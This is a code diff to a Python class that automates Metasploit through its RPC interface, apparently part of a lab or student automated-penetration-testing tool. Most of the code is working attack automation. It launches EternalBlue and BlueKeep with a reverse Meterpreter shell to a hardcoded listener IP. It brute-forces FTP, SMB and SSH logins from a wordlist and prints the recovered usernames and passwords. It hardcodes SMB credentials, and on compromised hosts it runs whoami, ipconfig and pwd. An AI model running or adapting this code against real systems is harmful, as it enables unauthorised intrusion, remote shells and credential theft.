@@ -2,14 +2,13 @@ from pymetasploit3.msfrpc import MsfRpcClient
 import logging, sys, random
 
 # TODO MAKE IT NOT HARD CODED
-LHOSTIP = '192.168.1.50'
+LHOSTIP = '192.168.1.226'
 
 class MetasploitInterface:
     portBindings = [55553]
 
     def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, logLevel): # Just for metasploit connection
-        logging.basicConfig(stream=sys.stdout, level=logLevel)
-
+        self.verbosity = logLevel
         self.metasploit_ip = metasploit_ip
         self.metasploit_port = metasploit_port
         self.metasploit_pass = metasploit_pass
@@ -92,24 +91,29 @@ class MetasploitInterface:
         try:
             sid_before = list(self.client.sessions.list.keys())[-1]
             results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
-            logging.info(results)
+            if self.verbosity == "INFO":
+                print(results)
             sid_after = list(self.client.sessions.list.keys())[-1]
 
         except IndexError as e:
-            logging.debug("Exception occured: Session Index Error")
+            if self.verbosity == "DEBUG":
+                print("Exception occured: Session Index Error")
+            
             sid_before = 0
             results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
             try:
                 sid_after = list(self.client.sessions.list.keys())[-1]
-                logging.info(results)
+                if self.verbosity == "INFO":
+                    print(results)
             except IndexError:
-                logging.debug("No sessions on start and host not vulnerable")
+                if self.verbosity == "DEBUG":
+                    print("No sessions on start and host not vulnerable")
                 sid_after = 0
         
         """ THIS CHECKS SESSION ID VALUES TO SEE IF THERE WAS A NEW SESSION, IF SO IT CONTINUES TO THEN EXECUTE COMMANDS"""
         if(sid_before == sid_after):
-            
-            logging.debug("There was an issue creating a session or the host is not vulnerable")
+            if self.verbosity == "DEBUG":
+                print("There was an issue creating a session or the host is not vulnerable")
             user_level = ""
             success = False
 
@@ -125,14 +129,16 @@ class MetasploitInterface:
                 address_properties = shell.read()
                 
                 success = True
-                
-                logging.info("Exploit was successful! Here are the results: ")
-                logging.info(f'User Level: {user_level}')
-                logging.info(f'Address Properties: \n {address_properties}')
+                if self.verbosity == "INFO":
+                    print(f"Success: {success}")
+                    print(f"User_Level: {user_level}")
+                    print(f"Address properties: \n {address_properties}")
+
                 
             except Exception as e:
-                logging.debug(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')
-                
+                if self.verbosity == "DEBUG":
+                    print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')
+
                 user_level = "No access"
                 success = False
 
@@ -148,29 +154,33 @@ class MetasploitInterface:
         """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
         success, user_level = False, ''
         module, specific_module = self.getModuleInfo(exploit)
-
+        
 
         """ SETS UP USAGE OF METASPLOIT MODULE AND TARGET"""
         exploit = self.client.modules.use(module, specific_module)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
-
+       
         """ CREATION OF CONSOLE, EXPLOIT RUN AND RESULTS RETURNED"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        
+        if self.verbosity == "INFO":
+            print(results)
         
         """ PARSING RESULTS TO SET APPROPRIATE VALUES FOR RETURN"""
         if "Anonymous READ" in results:
             success = True
             user_level = "USER_ACCESS"
+            if self.verbosity == "INFO":
+                print(f'Success: {success}')
+                print(f'User Level: {user_level}')
         else:
             success = False
             user_level = ""
-
-            logging.info(f'Success: {success}')
-            logging.info(f'User Level: {user_level}')
-            logging.info(f'Exploit: {exploit}')
+            if self.verbosity == "DEBUG":
+                print(f'Success: {success}')
+                print(f'User Level: {user_level}')
 
         self.client.consoles.console(cid).destroy
 
@@ -201,25 +211,27 @@ class MetasploitInterface:
         try:
             sid_before = list(self.client.sessions.list.keys())[-1]
             results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
-            logging.info(results)
+            if self.verbosity == "INFO":
+                print(results)
             sid_after = list(self.client.sessions.list.keys())[-1]
 
         except IndexError: 
             """ THIS INDEX ERROR CATCHES NO SESSIONS ON START UP"""
             sid_before = 0
             results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
-            logging.debug(results)
             try:
                 sid_after = list(self.client.sessions.list.keys())[-1]
+                if self.verbosity == "INFO":
+                    print(results)
             except IndexError:
                 """ THIS CATCHES THE NO SESSIONS ON START UP AND NO SESSIONS CREATED AFTER EXECUTION"""
-                
-                logging.debug("No sessions on start and host not vulnerable")
+                if self.verbosity == "DEBUG":
+                    print("No sessions on start and host not vulnerable")
                 sid_after = 0
         
         if(sid_before == sid_after):
-
-            logging.debug("There was an issue creating a session and/or the host is not vulnerable")
+            if self.verbosity == "DEBUG":
+                print("There was an issue creating a session and/or the host is not vulnerable")
             user_level = ""
             success = False
            
@@ -236,15 +248,16 @@ class MetasploitInterface:
                 
                 properties = shell.run_with_output('ipconfig')
             
-
-                logging.info(f'User Level: {user_level}')
-                logging.info(f'Directory Location: {directory}')
-                logging.info(f'Address Properties:\n {properties}')
-            
+                if self.verbosity == "INFO":
+                    print(f'User Level: {user_level}')
+                    print(f'Directory Location: {directory}')
+                    print(f'Address Properties:\n {properties}')
+                
                 success = True
             
             except Exception as e:
-                logging.debug(e)
+                if self.verbosity == "DEBUG":
+                    print(f"There was an error with Eternal Blue (see below) \n {e}")
                 user_level = "No access"
                 success = False
         
@@ -266,12 +279,16 @@ class MetasploitInterface:
         """ CREATES CONSOLE & RUNS EXPLOIT"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
-
+        if self.verbosity == "INFO":
+            print(results)
+        
         """ PARSING OF RESULTS"""
         if "Detected" in results:
             success = True
             user_level = ""
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"User_Level: {user_level}")
         else:
             success = False
             user_level = ""
@@ -298,7 +315,8 @@ class MetasploitInterface:
         try:
             sid_before = list(self.client.sessions.list.keys())[-1]
             results = self.client.consoles.console(cid).run_module_with_output(exploit)
-            logging.info(results)
+            if self.verbosity == "INFO":
+                print(results)
             sid_after = list(self.client.sessions.list.keys())[-1]
 
         except IndexError:
@@ -306,13 +324,17 @@ class MetasploitInterface:
             results = self.client.consoles.console(cid).run_module_with_output(exploit)
             try:
                 sid_after = list(self.client.sessions.list.keys())[-1]
-                logging.info(results)
+                if self.verbosity == "INFO":
+                    print(results)
             except IndexError:
-                logging.debug("No sessions on start and/or host not vulnerable")
+
+                if self.verbosity == "DEBUG":
+                    print("No sessions on start and/or host not vulnerable")
                 sid_after = 0
         
         if(sid_before == sid_after):
-            logging.debug("There was an issue creating a session and or the host is not vulnerable")
+            if self.verbosity == "DEBUG":
+                print("There was an issue creating a session and or the host is not vulnerable")
             user_level = "No access"
             success = False
            
@@ -325,19 +347,20 @@ class MetasploitInterface:
                 directory = shell.run_with_output('pwd')
                 properties = shell.run_with_output('ipconfig')
                 success = True
-
-                logging.info(f'User Level: {user_level}')
-                logging.info(f'Directory Location: {directory}')
-                logging.info(f'Address Properties: \n {properties}')
+                if self.verbosity == "INFO":
+                    print(f'User Level: {user_level}')
+                    print(f'Directory Location: {directory}')
+                    print(f'Address Properties: \n {properties}')
 
             
             except Exception as e:
-                logging.debug(e)
+                if self.verbosity == "DEBUG":
+                    print(f'There was an issue with BlueKeep (see below)\n {e}')
                 user_level = "No access"
                 success = False
         
         self.client.consoles.console(cid).destroy
-
+        
         return success, user_level, results
         
 
@@ -351,22 +374,37 @@ class MetasploitInterface:
         # print(exploit.missing_required)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
-        exploit["USERNAME"] = ''
-        exploit["PASSWORD"] = ''
-        exploit["PASS_FILE"] = '/usr/share/wordlists/metasploit/unix_passwords.txt'
-        exploit["USER_FILE"] = '/usr/share/wordlists/metasploit/unix_users.txt'
-        exploit["BLANK_PASSWORDS"]
+        exploit["USERPASS_FILE"] = '/home/kali/bruteforce.txt'
+        exploit["BRUTEFORCE_SPEED"] = 2
 
-        """ CREATES CONSOLE & RUNS EXPLOIT""" 
+        """ CREATES CONSOLE & RUNS EXPLOIT"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        print(type(results))
+        if self.verbosity == "INFO":
+            print(results)
+            
 
         """ PARSES RESULTS FOR PROPER RETURN"""
-        if "Successful FTP Login" in results:
+        if "Login Successful" in results:
             success = True
-            user_level = "USER_ACCESS"
-        
+            print("Credentials found:\n")
+            for line in results.split("\n"):
+                if "Login Successful" in line:
+                    username = line.split(':')[3].lstrip()
+                    password = line.split(":")[4]
+                    print(f"Username: {username} Password: {password}")
+                    if username == "root":
+                        user_level = "root"
+                    elif username == "admin":
+                        user_level = 'admin'
+
+                    else:
+                        user_level = "USER_ACCESS"            
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"User_Level: {user_level}")
+    
         self.client.consoles.console(cid).destroy
 
         return success, user_level, results
@@ -384,12 +422,17 @@ class MetasploitInterface:
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        if self.verbosity == "INFO":
+            print(results)
 
         """PARSES RESULTS FOR PROPER RETURN"""
         if "target is vulnerable" in results:
             success = True
             user_level = ""
+    
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f"user_level")
 
         return success, user_level, results
 
@@ -408,7 +451,8 @@ class MetasploitInterface:
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        if self.verbosity == "INFO":
+            print(results)
 
         """ PARSES RESULTS FOR PROPER RETURN"""
         if "VULNERABLE" in results:
@@ -426,17 +470,28 @@ class MetasploitInterface:
         exploit = self.client.modules.use(module, specific_module)        
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
-        exploit["USERPASS_FILE"] = "/usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt"
+        exploit["USERPASS_FILE"] = "/home/kali/bruteforce.txt"
+        exploit["BRUTEFORCE_SPEED"] = 4
+
 
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        if self.verbosity == "INFO":
+            print(results)
 
         """PARSES RESULTS FOR PROPER RETURN"""
-        if "VULNERABLE" in results:
+        if "Success" in results:
+            if self.verbosity == "INFO":
+                print("Credentials Found:")
+
+            for line in results.split("\n"):
+                if "Success" in line:
+                    username = line.split("'")[1].strip()
+                    username = username.split('\\')[1]
+                    print(username)
             success = True
-            user_level = ""
+            user_level = "USER_ACCESS"
         
         return success, user_level, results
 
@@ -452,7 +507,8 @@ class MetasploitInterface:
         """CREATES CONSOLE & EXECUTES EXPLOIT"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        if self.verbosity == "INFO":
+            print(results)
 
         if "SMB Detected" in results:
             success = True
@@ -469,19 +525,84 @@ class MetasploitInterface:
         exploit = self.client.modules.use(module, specific_module)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
-        exploit["USERPASS_FILE"] = 'usr/share/wordlists/metasploit/piata_ssh_userpass.txt'
+        exploit["USERPASS_FILE"] = '/home/kali/bruteforce.txt'
+        exploit["BRUTEFORCE_SPEED"] = 4
+        exploit["VERBOSE"] = True
 
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
         cid = self.client.consoles.console().cid
-        results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        # results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        try:
+            sid_before = list(self.client.sessions.list.keys())[-1]
+            results = self.client.consoles.console(cid).run_module_with_output(exploit)
+            if self.verbosity == "INFO":
+                print(results)
+            sid_after = list(self.client.sessions.list.keys())[-1]
 
-        """ NEED TO GET CORRECT RESULTS SETUP - NEED BOX TO BE SETUP FOR PROPER RETURNING"""
-        if "VULNERABLE" in results:
-            success = True
+        except IndexError as e:
+            if self.verbosity == "DEBUG":
+                print("Exception occured: Session Index Error")
+            
+            sid_before = 0
+            results = self.client.consoles.console(cid).run_module_with_output(exploit)
+            try:
+                sid_after = list(self.client.sessions.list.keys())[-1]
+                if self.verbosity == "INFO":
+                    print(results)
+            except IndexError:
+                if self.verbosity == "DEBUG":
+                    print("No sessions on start and host not vulnerable")
+                sid_after = 0
+        
+        """ THIS CHECKS SESSION ID VALUES TO SEE IF THERE WAS A NEW SESSION, IF SO IT CONTINUES TO THEN EXECUTE COMMANDS"""
+        if(sid_before == sid_after):
+            if self.verbosity == "DEBUG":
+                print("There was an issue creating a session or the host is not vulnerable")
             user_level = ""
-      
+            success = False
+
+        else: 
+            try:
+                
+                shell = self.client.sessions.session(sid_after)
+                shell.write('whoami')
+                
+                user_level = shell.read()
+                user_level = "USER_ACCESS"
+                
+                shell.write('ifconfig')
+                address_properties = shell.read()
+                
+                success = True
+                if self.verbosity == "INFO":
+                    print(f"Success: {success}")
+                    print(f"User_Level: {user_level}")
+                    print(f"Address properties: \n {address_properties}")
+
+                
+            except Exception as e:
+                if self.verbosity == "DEBUG":
+                    print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')
+
+                user_level = "No access"
+                success = False
+
+        
+           
+        self.client.consoles.console(cid).destroy
+        # self.portBindings.remove(localPort)
+        
         return success, user_level, results
+        
+        # if self.verbosity == "INFO":
+        #     print(results)
+
+        # """ NEED TO GET CORRECT RESULTS SETUP - NEED BOX TO BE SETUP FOR PROPER RETURNING"""
+        # if "VULNERABLE" in results:
+        #     success = True
+        #     user_level = ""
+      
+        # return success, user_level, results
 
     def scanSSHversion(self, target, exploit, port):
         """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
@@ -497,11 +618,15 @@ class MetasploitInterface:
         """ CREATES CONSOLE & EXECUTES EXPLOIT"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        if self.verbosity == "INFO":
+            print(results)
 
         if "SSH server version" in results:
             success = True
             user_level = ""
+            if self.verbosity == "INFO":
+                print(f"Success: {success}")
+                print(f'User_Level: {user_level}')
   
         return success, user_level, results
 
@@ -518,11 +643,17 @@ class MetasploitInterface:
         """ CREATES CONSOLE AND EXECUTES MODULE"""
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
-        logging.info(results)
+        if self.verbosity == "INFO":
+            print(results)
 
         if "FTP Banner" in results:
             success = True
             user_level = ""
+            if self.verbosity == "INFO":
+                print(f'Success: {success}')
+                print(f'User Level: {user_level}')
+            
+            
 
         return success, user_level, results
 
@@ -535,27 +666,39 @@ class MetasploitInterface:
         exploit = self.client.modules.use(module, specific_module)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
+        exploit["SMBPass"] = "Passw0rd!"
+        exploit["SMBUser"] = 'IEUser'
+        exploit["ConnectTimeout"] = 100
 
-        """ CREATES CONSOLE AND EXECUTES EXPLOIT WITH ERROR HANDLING"""
+        payload = self.client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+
+        payload['LHOST'] = LHOSTIP
+        # payload['LPORT'] = self.generateLPORT()
+
+        """ CREATES CONSOLE & EXECUTES EXPLOIT ERROR HANDLING"""
         cid = self.client.consoles.console().cid
         try:
             sid_before = list(self.client.sessions.list.keys())[-1]
             results = self.client.consoles.console(cid).run_module_with_output(exploit)
-            logging.info(results)
             sid_after = list(self.client.sessions.list.keys())[-1]
+            if self.verbosity == "INFO":
+                print(results)
 
         except IndexError as e:
             sid_before = 0
             results = self.client.consoles.console(cid).run_module_with_output(exploit)
-            logging.info(results)
+            if self.verbosity == "DEBUG":
+                print(results)
             try:
                 sid_after = list(self.client.sessions.list.keys())[-1]
+                if self.verbosity == "INFO":
+                    print(results)
             except IndexError as e:
-                logging.debug(e)
                 sid_after = 0
         
         if(sid_before == sid_after):
-            logging.debug("There was an issue creating a session or the host is not vulnerable" )
+            if self.verbosity == "DEBUG":
+                print("There was an issue creating a session or the host is not vulnerable" )
             user_level = "No access"
             success = False
            
@@ -568,13 +711,14 @@ class MetasploitInterface:
                 properties = shell.run_with_output('ipconfig')
 
                 success = True
-
-                logging.info(f'User Level: {user_level}')
-                logging.info(f'Directory Location: {directory}')
-                logging.info(f'Address Properties:\n {properties}')
+                if self.verbosity == "INFO":
+                    print(f'User Level: {user_level}')
+                    print(f'Directory Location: {directory}')
+                    print(f'Address Properties:\n {properties}')
             
             except Exception as e:
-                logging.debug(e)
+                if self.verbosity == "DEBUG":
+                    print(e)
                 user_level = "No access"
                 success = False
         
@@ -590,7 +734,7 @@ class MetasploitInterface:
             localPort = random.ranint(49152,65535)
             
         self.portBindings.append(localPort)
-        # print("GENERATE LOCAL PORT PORT" + str(localPort))
+
         return localPort
 
     """ SEPARATES AND OBTAINS MODULE INFORMATION FOR SETUP"""
@@ -600,8 +744,7 @@ class MetasploitInterface:
         specific_module = "/".join(split_string[1:])
 
         return module, specific_module
-
-
+        
 # functions_list = [exploitFTP, scanFTP, eternalBlue, rdpScanner, blueKeep]
 
 # Outputs:
